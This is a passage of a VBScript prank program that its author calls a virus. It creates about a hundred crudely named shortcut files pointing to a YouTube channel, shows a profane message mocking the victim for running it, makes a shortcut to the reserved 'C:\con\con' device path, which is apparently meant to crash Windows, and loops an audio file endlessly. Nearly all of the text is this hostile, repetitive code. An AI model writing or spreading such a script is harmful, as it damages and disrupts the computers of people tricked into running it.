Set oUrlLink = WshShell.CreateShortcut("FUCKED103.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED104.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED105.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED106.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED107.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED108.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED109.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED110.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED111.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED112.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED113.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED114.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED115.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED116.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED117.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED118.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED119.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED120.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED121.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED122.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED123.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED124.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED125.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED126.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED127.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED128.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED129.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED130.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED131.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED132.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED133.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED134.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED135.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED136.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED137.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED138.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED139.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED140.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED140.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED141.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED142.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED143.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED144.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED145.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED146.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED147.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED148.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED149.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED150.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED151.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED152.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED153.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED154.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED155.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED156.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED157.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED158.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED159.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED160.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED161.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED162.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED163.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED164.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED165.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED166.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED167.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED168.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED169.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED170.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED171.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED172.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED173.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED174.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED175.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED176.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED177.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED178.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED179.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED180.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED181.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED182.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED183.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED184.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED185.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED186.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED187.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED188.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED189.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED190.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED191.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED192.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED193.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED194.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED195.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED196.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED197.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED198.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED199.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED200.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

X=MsgBox("Well isn't this great. You came across my shitty virus I made under 15 minutes. Are you that gullible? At least look at the code of the shit you're downloading.. Well. Looks like your fucked now!", 0+16, "You're fucked now! Made by T3chyy#0001 on Discord")

Set oUrlLink = WshShell.CreateShortcut("lmao.lnk")
oUrlLink.TargetPath = "C:\con\con"
oUrlLink.Save


End If

Set Sound = CreateObject("WMPlayer.OCX.7")
do
Sound.URL = "Cofdance.mp3"
Sound.Controls.play
do while Sound.currentmedia.duration = 0
wscript.sleep 100
loop
wscript.sleep (int(Sound.currentmedia.duration)+1)*1000
loop